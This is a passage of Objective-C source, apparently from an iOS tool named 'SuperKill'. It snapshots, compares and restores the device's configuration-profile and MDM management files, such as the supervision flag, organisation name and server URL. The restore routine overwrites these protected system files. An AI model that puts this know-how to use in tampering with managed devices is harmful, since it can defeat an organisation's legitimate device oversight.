                  id mdm = SKReadPlist([SKConfigurationProfilesRoot stringByAppendingPathComponent:@"MDM.plist"]);
                  if ([mdm isKindOfClass:[NSDictionary class]]) {
                      cfg[@"mdm"] = [self subsetOf:mdm keys:SKMDMKeys()];
                  }
                  id manifest = SKReadPlist([SKConfigurationProfilesRoot stringByAppendingPathComponent:@"PayloadManifest.plist"]);
                  if ([manifest isKindOfClass:[NSDictionary class]]) {
                      id ordered = manifest[@"OrderedProfiles"];
                      if ([ordered isKindOfClass:[NSArray class]]) cfg[@"orderedProfiles"] = @([ordered count]);
                  }
              }
              roots[SKConfigurationProfilesRoot] = cfg;

              // 2) DeviceManagement
              NSMutableDictionary *dev = [NSMutableDictionary dictionary];
              BOOL devAvailable = [self grantAccessTo:SKDeviceManagementRoot];
              dev[@"available"] = @(devAvailable);
              if (devAvailable) {
                  dev[@"entries"] = [self describeEntriesIn:SKDeviceManagementRoot];

                  id cloud = SKReadPlist([SKDeviceManagementRoot stringByAppendingPathComponent:@"CloudConfigurationDetails.plist"]);
                  if ([cloud isKindOfClass:[NSDictionary class]]) {
                      dev[@"cloud"] = [self subsetOf:cloud keys:SKCloudKeys()];
                  }
                  id truth = SKReadPlist([SKDeviceManagementRoot stringByAppendingPathComponent:@"ClientTruth.plist"]);
                  if ([truth isKindOfClass:[NSDictionary class]]) {
                      id entry = truth[@"CloudConfiguration"];
                      if ([entry isKindOfClass:[NSDictionary class]]) {
                          dev[@"clientTruth"] = [self subsetOf:entry keys:SKTruthKeys()];
                      }
                  }
              }
              roots[SKDeviceManagementRoot] = dev;

              // 3) 用户级 profile 目录
              NSMutableDictionary *usr = [NSMutableDictionary dictionary];
              BOOL usrAvailable = [self grantAccessTo:SKUserProfilesRoot];
              usr[@"available"] = @(usrAvailable);
              if (usrAvailable) {
                  usr[@"entries"] = [self describeEntriesIn:SKUserProfilesRoot];
              }
              roots[SKUserProfilesRoot] = usr;

              state[@"roots"] = roots;
              return state;
          }

          - (NSString *)summarizeState:(NSDictionary *)state {
              NSDictionary *roots = state[@"roots"];
              NSDictionary *cfg = roots[SKConfigurationProfilesRoot] ?: @{};
              NSDictionary *cloud = cfg[@"cloud"] ?: @{};
              NSDictionary *mdm = cfg[@"mdm"] ?: @{};

              return [NSString stringWithFormat:@"iOS %@ · ConfigurationProfiles %lu 项 · IsSupervised=%@ · 组织=%@ · MDM=%@",
                      state[@"os"] ?: @"?",
                      (unsigned long)[cfg[@"entries"] count],
                      cloud[@"IsSupervised"] ?: @"(无)",
                      cloud[@"OrganizationName"] ?: @"(无)",
                      mdm[@"ServerURL"] ?: @"(无)"];
          }

          - (NSString *)captureSnapshotWithLabel:(NSString *)label {
              NSMutableDictionary *state = [[self captureState] mutableCopy];
              NSString *text = label.length ? label : @"snapshot";
              state[@"label"] = text;

              NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
              formatter.dateFormat = @"yyyyMMdd-HHmmss";
              NSString *stamp = [formatter stringFromDate:[NSDate date]];

              NSCharacterSet *unsafe = [NSCharacterSet characterSetWithCharactersInString:@"/\\: "];
              NSString *safe = [[text componentsSeparatedByCharactersInSet:unsafe] componentsJoinedByString:@"_"];
              NSString *name = [NSString stringWithFormat:@"%@-%@.plist", stamp, safe];

              NSString *dir = [self snapshotsRoot];
              [[NSFileManager defaultManager] createDirectoryAtPath:dir
                                        withIntermediateDirectories:YES
                                                         attributes:nil
                                                              error:NULL];
              BOOL ok = SKWritePlist(state, [dir stringByAppendingPathComponent:name]);

              NSString *summary = [self summarizeState:state];
              [self log:@"📸 %@ %@：%@", ok ? @"快照已保存" : @"快照写入失败", name, summary];
              return summary;
          }

          - (NSString *)snapshotTitle:(NSDictionary *)snapshot {
              NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
              formatter.dateFormat = @"MM-dd HH:mm:ss";
              NSDate *date = snapshot[@"created"];
              NSString *when = [date isKindOfClass:[NSDate class]] ? [formatter stringFromDate:date] : @"?";
              return [NSString stringWithFormat:@"%@ @ %@", snapshot[@"label"] ?: @"snapshot", when];
          }

          - (NSString *)valueText:(id)value {
              if (!value) return @"(无)";
              NSString *text = [value description];
              if (text.length > 60) {
                  text = [[text substringToIndex:60] stringByAppendingString:@"…"];
              }
              return text;
          }

          - (void)appendEntriesDiffFrom:(NSDictionary *)left
                                     to:(NSDictionary *)right
                                   into:(NSMutableString *)out {
              NSDictionary *l = left ?: @{};
              NSDictionary *r = right ?: @{};

              NSMutableSet *names = [NSMutableSet setWithArray:l.allKeys];
              [names addObjectsFromArray:r.allKeys];
              NSArray *sorted = [names.allObjects sortedArrayUsingSelector:@selector(compare:)];

              NSMutableArray<NSString *> *lines = [NSMutableArray array];
              for (NSString *name in sorted) {
                  NSDictionary *lm = l[name];
                  NSDictionary *rm = r[name];
                  if (!lm && rm) {
                      [lines addObject:[NSString stringWithFormat:@"  + %@ (%@ B)", name, rm[@"size"] ?: @"?"]];
                  } else if (lm && !rm) {
                      [lines addObject:[NSString stringWithFormat:@"  − %@ (%@ B)", name, lm[@"size"] ?: @"?"]];
                  } else if (![lm[@"size"] isEqual:rm[@"size"]]) {
                      [lines addObject:[NSString stringWithFormat:@"  ~ %@ 大小 %@ → %@ B",
                                        name, lm[@"size"] ?: @"?", rm[@"size"] ?: @"?"]];
                  }
              }

              if (lines.count == 0) {
                  [out appendString:@"  目录结构无变化\n"];
              } else {
                  [out appendFormat:@"%@\n", [lines componentsJoinedByString:@"\n"]];
              }
          }

          - (void)appendValuesDiffFrom:(NSDictionary *)left
                                    to:(NSDictionary *)right
                               section:(NSString *)section
                                  into:(NSMutableString *)out {
              NSDictionary *l = [left isKindOfClass:[NSDictionary class]] ? left : nil;
              NSDictionary *r = [right isKindOfClass:[NSDictionary class]] ? right : nil;
              if (!l && !r) return;

              NSMutableSet *keys = [NSMutableSet setWithArray:(l.allKeys ?: @[])];
              [keys addObjectsFromArray:(r.allKeys ?: @[])];

              NSArray *sorted = [keys.allObjects sortedArrayUsingSelector:@selector(compare:)];
              for (NSString *key in sorted) {
                  id lv = l[key];
                  id rv = r[key];
                  if ([lv isEqual:rv]) continue;
                  [out appendFormat:@"  %@.%@: %@ → %@\n", section, key, [self valueText:lv], [self valueText:rv]];
              }
          }

          - (NSString *)diffFrom:(NSDictionary *)left to:(NSDictionary *)right {
              NSMutableString *out = [NSMutableString string];
              [out appendFormat:@"\n=== %@  →  %@ ===\n", [self snapshotTitle:left], [self snapshotTitle:right]];

              NSDictionary *leftRoots = left[@"roots"] ?: @{};
              NSDictionary *rightRoots = right[@"roots"] ?: @{};

              id lSup = leftRoots[SKConfigurationProfilesRoot][@"cloud"][@"IsSupervised"];
              id rSup = rightRoots[SKConfigurationProfilesRoot][@"cloud"][@"IsSupervised"];
              [out appendFormat:@"监管: %@ → %@\n", [self valueText:lSup], [self valueText:rSup]];

              NSArray<NSString *> *roots = @[SKConfigurationProfilesRoot, SKDeviceManagementRoot, SKUserProfilesRoot];
              for (NSString *root in roots) {
                  NSDictionary *l = leftRoots[root];
                  NSDictionary *r = rightRoots[root];
                  if (!l && !r) continue;

                  [out appendFormat:@"\n[%@]\n", root.lastPathComponent];

                  if (!l || !r) {
                      [out appendString:@"  只有一侧存在快照，跳过\n"];
                      continue;
                  }

                  BOOL lAvailable = [l[@"available"] boolValue];
                  BOOL rAvailable = [r[@"available"] boolValue];
                  if (lAvailable != rAvailable) {
                      [out appendFormat:@"  可用性: %@ → %@\n",
                       lAvailable ? @"可读写" : @"不可用", rAvailable ? @"可读写" : @"不可用"];
                  }

                  [self appendEntriesDiffFrom:l[@"entries"] to:r[@"entries"] into:out];

                  for (NSString *section in @[@"cloud", @"mdm", @"clientTruth"]) {
                      [self appendValuesDiffFrom:l[section] to:r[section] section:section into:out];
                  }

                  id lOrdered = l[@"orderedProfiles"];
                  id rOrdered = r[@"orderedProfiles"];
                  if (![lOrdered isEqual:rOrdered]) {
                      [out appendFormat:@"  orderedProfiles: %@ → %@\n",
                       lOrdered ?: @"(无)", rOrdered ?: @"(无)"];
                  }
              }

              return out;
          }

          - (NSString *)diffSnapshotChain {
              NSFileManager *fm = [NSFileManager defaultManager];
              NSString *dir = [self snapshotsRoot];
              [fm createDirectoryAtPath:dir withIntermediateDirectories:YES attributes:nil error:NULL];

              NSArray<NSString *> *names = [[fm contentsOfDirectoryAtPath:dir error:NULL]
                                            sortedArrayUsingSelector:@selector(compare:)];
              NSMutableArray<NSDictionary *> *snapshots = [NSMutableArray array];
              for (NSString *name in names) {
                  if (![name.pathExtension isEqualToString:@"plist"]) continue;
                  id snapshot = SKReadPlist([dir stringByAppendingPathComponent:name]);
                  if ([snapshot isKindOfClass:[NSDictionary class]]) [snapshots addObject:snapshot];
              }

              if (snapshots.count == 0) {
                  [self log:@"还没有快照：先点 ⑧ 记录一份基线"];
                  return @"";
              }

              NSMutableDictionary *current = [[self captureState] mutableCopy];
              current[@"label"] = @"当前";

              NSMutableString *out = [NSMutableString string];
              for (NSUInteger i = 1; i < snapshots.count; i++) {
                  [out appendString:[self diffFrom:snapshots[i - 1] to:snapshots[i]]];
              }
              [out appendString:[self diffFrom:snapshots.lastObject to:current]];

              [out insertString:[NSString stringWithFormat:@"共 %lu 份快照，逐对比较 + 最新快照 vs 当前\n",
                                 (unsigned long)snapshots.count]
                        atIndex:0];
              [self log:@"%@", out];
              return out;
          }

          #pragma mark - 回滚

          - (BOOL)restoreLatestBackup:(NSError **)error {
              NSFileManager *fm = [NSFileManager defaultManager];
              NSArray<NSString *> *dirs = [fm contentsOfDirectoryAtPath:[self backupsRoot] error:NULL];
              NSString *latest = [dirs sortedArrayUsingSelector:@selector(compare:)].lastObject;
              if (latest.length == 0) {
                  if (error) {
                      *error = [NSError errorWithDomain:@"SuperKill"
                                                   code:3
                                               userInfo:@{NSLocalizedDescriptionKey: @"没有可用备份"}];
                  }
                  return NO;
              }

              NSString *dir = [[self backupsRoot] stringByAppendingPathComponent:latest];
              NSDictionary<NSString *, NSString *> *map = SKReadPlist([dir stringByAppendingPathComponent:@"roots.plist"]);
              if (![map isKindOfClass:[NSDictionary class]] || map.count == 0) {
                  if (error) {
                      *error = [NSError errorWithDomain:@"SuperKill"
                                                   code:4
                                               userInfo:@{NSLocalizedDescriptionKey: @"备份清单损坏"}];
                  }
                  return NO;
              }

              NSInteger restored = 0;
              for (NSString *slug in map) {
                  NSString *target = map[slug];
                  if (![self grantAccessTo:target]) continue;
                  NSString *src = [dir stringByAppendingPathComponent:slug];
                  for (NSString *name in [fm contentsOfDirectoryAtPath:src error:NULL]) {
                      if ([name isEqualToString:@"roots.plist"]) continue;
                      NSString *from = [src stringByAppendingPathComponent:name];
                      NSString *to = [target stringByAppendingPathComponent:name];
                      [fm removeItemAtPath:to error:NULL];
                      if ([fm copyItemAtPath:from toPath:to error:NULL]) restored++;
                  }
                  [self log:@"↺ 已还原 %@", target.lastPathComponent];
              }

              [self log:@"✓ 回滚完成（%ld 项）：%@", (long)restored, latest];
              return restored > 0;
          }

